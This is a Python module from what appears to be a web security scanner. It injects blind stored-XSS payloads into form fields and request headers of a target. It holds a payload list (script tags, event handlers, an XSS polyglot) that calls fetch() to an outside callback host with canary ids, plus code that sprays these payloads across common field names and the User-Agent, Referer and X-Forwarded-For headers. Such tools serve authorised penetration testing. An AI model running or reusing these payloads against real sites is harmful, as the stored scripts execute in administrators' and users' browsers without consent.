"""
RedTeef — Blind XSS confirmation.

Delayed-trigger payloads for stored XSS in admin panels, dashboards,
logs, and other backend surfaces. Uses callback canaries.

CWE-79: Improper Neutralization of Input During Web Page Generation
"""

from __future__ import annotations

import logging
import secrets
import time
from typing import Dict, List, Optional

import httpx

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient, HttpClientMixin

logger = logging.getLogger("krumpa.redteef.blind_xss_confirmer")


def _generate_canary_id() -> str:
    """Generate a unique canary identifier for callback correlation."""
    return secrets.token_hex(8)


def _build_callback_url(base_url: str, canary_id: str) -> str:
    """Build a callback URL with the canary ID."""
    return f"{base_url.rstrip('/')}/xss/{canary_id}"


# Blind XSS payload templates — {callback} is replaced with the callback URL
_BLIND_XSS_PAYLOADS = [
    {
        "label": "Script src",
        "template": '<script src="{callback}"></script>',
    },
    {
        "label": "Img onerror",
        "template": '<img src=x onerror="fetch(\'{callback}\')">',
    },
    {
        "label": "SVG onload",
        "template": '<svg onload="fetch(\'{callback}\')">',
    },
    {
        "label": "Body onload",
        "template": '<body onload="fetch(\'{callback}\')">',
    },
    {
        "label": "Input onfocus autofocus",
        "template": '<input onfocus="fetch(\'{callback}\')" autofocus>',
    },
    {
        "label": "Details ontoggle",
        "template": '<details open ontoggle="fetch(\'{callback}\')"><summary>x</summary></details>',
    },
    {
        "label": "Iframe srcdoc",
        "template": '<iframe srcdoc="<script>fetch(\'{callback}\')</script>">',
    },
    {
        "label": "Event handler in attribute",
        "template": '" onfocus="fetch(\'{callback}\')" autofocus="',
    },
    {
        "label": "JavaScript URL in href",
        "template": '<a href="javascript:fetch(\'{callback}\')">click</a>',
    },
    {
        "label": "CSS injection callback",
        "template": '<style>body{{background:url("{callback}")}}</style>',
    },
    {
        "label": "Polyglot XSS",
        "template": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=fetch('{callback}'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch('{callback}')///>\\x3e",
    },
]

# Fields commonly vulnerable to stored XSS
_INJECTABLE_FIELDS = [
    "name", "username", "email", "comment", "message", "bio",
    "description", "title", "feedback", "review", "note",
    "user_agent", "referer", "x-forwarded-for",
]


class BlindXssConfirmer(HttpClientMixin):
    """
    Confirm blind/stored XSS by:
      1. Injecting callback-bearing payloads into various fields
      2. Monitoring a callback endpoint for trigger confirmations
      3. Using multiple payload variants (script, img, svg, etc.)
      4. Supporting both field-based and header-based injection
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
        callback_base_url: str = "https://xss.krumpa.example.com",
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None
        self._callback_base = callback_base_url
        self._injected_canaries: Dict[str, Dict[str, str]] = {}

    async def inject(
        self,
        target: Target,
        inject_field: str = "",
    ) -> List[Finding]:
        """
        Inject blind XSS payloads. Returns findings for injection
        success (stored). Actual confirmation happens asynchronously
        via callback monitoring.

        Args:
            target: The target endpoint.
            inject_field: Specific field to inject into. If empty, tries common fields.

        Returns:
            List of informational findings about successful injections.
        """
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)
        fields = [inject_field] if inject_field else _INJECTABLE_FIELDS

        try:
            for field_name in fields:
                for payload_spec in _BLIND_XSS_PAYLOADS[:5]:  # top 5 payloads
                    result = await self._inject_payload(
                        client, target, field_name, payload_spec,
                    )
                    if result:
                        findings.append(result)
                        break  # one per field
        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    async def confirm(
        self,
        target: Target,
        inject_field: str = "",
    ) -> List[Finding]:
        """
        Attempt immediate confirmation by injecting and checking
        if the payload is reflected/stored. For true blind XSS,
        use inject() and monitor callbacks separately.
        """
        findings: List[Finding] = []
        client = self._client or HttpClient(timeout=10.0, retries=0)
        fields = [inject_field] if inject_field else _INJECTABLE_FIELDS

        try:
            for field_name in fields:
                for payload_spec in _BLIND_XSS_PAYLOADS[:5]:
                    canary_id = _generate_canary_id()
                    callback_url = _build_callback_url(self._callback_base, canary_id)
                    payload = payload_spec["template"].format(callback=callback_url)

                    # Inject the payload
                    try:
                        if target.method and target.method.upper() == "GET":
                            params = {field_name: payload}
                            resp = await client.request("GET", target.url, params=params)
                        else:
                            body = {field_name: payload}
                            resp = await client.request(
                                target.method or "POST", target.url, json_body=body,
                            )

                        if resp.status_code in (200, 201, 202):
                            # Check if payload is stored/reflected
                            if callback_url in resp.text or canary_id in resp.text:
                                findings.append(Finding(
                                    title=f"[CONFIRMED] Stored XSS payload reflected on {target.url}",
                                    description=(
                                        f"Blind XSS payload ({payload_spec['label']}) "
                                        f"injected via '{field_name}' was reflected in "
                                        f"the response. This confirms the payload is stored "
                                        f"and will execute when viewed by other users."
                                    ),
                                    severity=Severity.HIGH,
                                    target=target,
                                    evidence=(
                                        f"Payload: {payload_spec['label']}\n"
                                        f"Field: {field_name}\n"
                                        f"Canary: {canary_id}\n"
                                        f"Status: {resp.status_code}"
                                    ),
                                    remediation=(
                                        "Sanitize all user input before storage. Use "
                                        "output encoding (HTML entity encoding) when "
                                        "rendering user content. Implement Content-Security-Policy "
                                        "headers to block inline scripts."
                                    ),
                                    cwe=79,
                                    tags=["confirmed", "blind-xss", "stored-xss", "redteef"],
                                ))
                                return findings
                    except (httpx.HTTPError, OSError, ValueError):
                        continue
        finally:
            if self._owns_client and client is not self._client:
                await client.close()

        return findings

    async def _inject_payload(
        self,
        client: HttpClient,
        target: Target,
        field_name: str,
        payload_spec: dict,
    ) -> Optional[Finding]:
        """Inject a single blind XSS payload."""
        canary_id = _generate_canary_id()
        callback_url = _build_callback_url(self._callback_base, canary_id)
        payload = payload_spec["template"].format(callback=callback_url)

        try:
            if field_name.lower() in ("user_agent", "referer", "x-forwarded-for"):
                # Header injection
                header_map = {
                    "user_agent": "User-Agent",
                    "referer": "Referer",
                    "x-forwarded-for": "X-Forwarded-For",
                }
                header_name = header_map.get(field_name.lower(), field_name)
                resp = await client.request(
                    target.method or "GET", target.url,
                    headers={header_name: payload},
                )
            else:
                # Body injection
                body = {field_name: payload}
                resp = await client.request(
                    target.method or "POST", target.url, json_body=body,
                )

            if resp.status_code in (200, 201, 202):
                # Store canary for later callback correlation
                self._injected_canaries[canary_id] = {
                    "url": target.url,
                    "field": field_name,
                    "payload": payload_spec["label"],
                    "timestamp": str(time.time()),
                }

                return Finding(
                    title=f"Blind XSS payload injected on {target.url}",
                    description=(
                        f"Blind XSS payload ({payload_spec['label']}) was "
                        f"accepted via field '{field_name}'. If this data is "
                        f"rendered in an admin panel or dashboard, the payload "
                        f"will execute and call back to the monitoring server."
                    ),
                    severity=Severity.INFO,
                    target=target,
                    evidence=(
                        f"Payload: {payload_spec['label']}\n"
                        f"Field: {field_name}\n"
                        f"Canary ID: {canary_id}\n"
                        f"Status: {resp.status_code}"
                    ),
                    remediation=(
                        "Sanitize all stored user input. Use output encoding "
                        "in all rendering contexts. Implement CSP headers."
                    ),
                    cwe=79,
                    tags=["blind-xss", "injection-pending", "redteef"],
                )
        except (httpx.HTTPError, OSError, ValueError):
            pass

        return None
